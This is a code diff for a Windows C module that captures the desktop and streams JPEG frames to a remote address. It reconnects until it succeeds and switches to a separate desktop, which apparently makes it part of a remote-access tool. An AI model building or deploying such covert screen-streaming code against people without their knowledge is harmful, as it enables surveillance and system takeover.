@@ -6,14 +6,15 @@
 #include <stdlib.h>
 #include <string.h>
 #include "../utils/jpeg.h"
-#include "socks.h"
+#include "../utils/sockslib.h"
+#include "../utils/desktops.h"
 static HDESK dsk;
 static int sendframe = 0;
 static int fullf = 0;
-
+static SOCKET vnc_sock;
 static void inputthd(){
     while(1){
-        char* data = vnc_sock_recv();
+        char* data = vnc_sock_recv(vnc_sock);
         if(data==NULL) return;
         if(data[0]==0x67){
             //full frame send, do not use incremental
@@ -23,14 +24,19 @@ static void inputthd(){
         free(data);
     }
 }
+
 void vncspawn(NETWORK* net){
-    dsk = GetThreadDesktop(GetCurrentThreadId());
-    while(vnc_sock_init(net->ip, net->port) == -1) Sleep(1000);
+    setThdDsk();
+    char datum[100] = {0};
+    GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, datum, 100, NULL);
+    dsk = OpenDesktopA(current_dsk, 0, FALSE, GENERIC_ALL);
+    while(newsock(net->ip, net->port, &vnc_sock) == -1) Sleep(1000);
     HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthd, NULL, 0, NULL);
     HWND hDesk = GetDesktopWindow();
     RECT rect;
     GetClientRect(hDesk, &rect);
-    
+    if(rect.right == 0 || rect.bottom == 0)
+        return;
     //scaling detect implementation
     HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
     int maxrt = 0;
@@ -49,9 +55,9 @@ void vncspawn(NETWORK* net){
     double dy = ((double)maxbt)/((double)rect.bottom);
     if(dx>dy) factor = dx;
     else factor = dy;
+    if(factor < 1) factor = 1;
     rect.right *= factor;
     rect.bottom *= factor;
-    
     //begin vnc
     HDC hdc = GetDC(NULL);
     unsigned char* pastbm = calloc(10000000, 1);
@@ -112,7 +118,7 @@ void vncspawn(NETWORK* net){
         char* jpg = bmptojpg(hBmp, &sz);
         DeleteObject(hBmp);
         DeleteDC(hNew);
-        if(vnc_sock_send(jpg, sz, left, top)) break;
+        if(vnc_sock_send(jpg, sz, left, top, vnc_sock)) break;
     }
     free(bitmap);
     free(net->ip);
